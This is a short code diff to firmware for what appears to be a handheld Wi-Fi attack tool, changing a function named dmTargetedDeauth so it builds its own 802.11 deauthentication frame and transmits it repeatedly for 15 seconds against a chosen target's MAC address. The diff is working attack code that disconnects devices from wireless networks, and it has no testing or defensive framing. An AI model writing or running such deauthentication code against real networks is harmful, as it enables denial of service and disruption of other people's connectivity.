@@ -1,5 +1,6 @@
 #if !defined(LITE_VERSION)
 #include "../wifi/sniffer.h"
+#include "../wifi/mopie_tx.h"
 #include "../wifi/wifi_atks.h"
 #include "core/mykeyboard.h"
 #include "core/wifi/wifi_common.h"
@@ -209,11 +210,11 @@ void dmTargetedDeauth() {
     updateUi(true);
     unsigned long t0 = millis();
     int deauthCount = 0;
+    uint8_t dframe[26];
+    mopie_build_deauth(dframe, (const uint8_t *)tgt.MAC, _default_target, 0x0001);
     while (!check(EscPress) && !pwnagotchi_exit && millis() - t0 < 15000) {
-        // send a directed deauth to the target (broadcast + its MAC)
-        memcpy(&ap_record.bssid, tgt.MAC, 6);
-        wsl_bypasser_send_raw_frame(&ap_record, tchan, _default_target);
-        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        // send our OWN from-scratch directed deauth to the target
+        mopie_send_raw(dframe, sizeof(dframe), tchan, 1);
         deauthCount++;
 
         // quick blip animation on the screen while we hammer
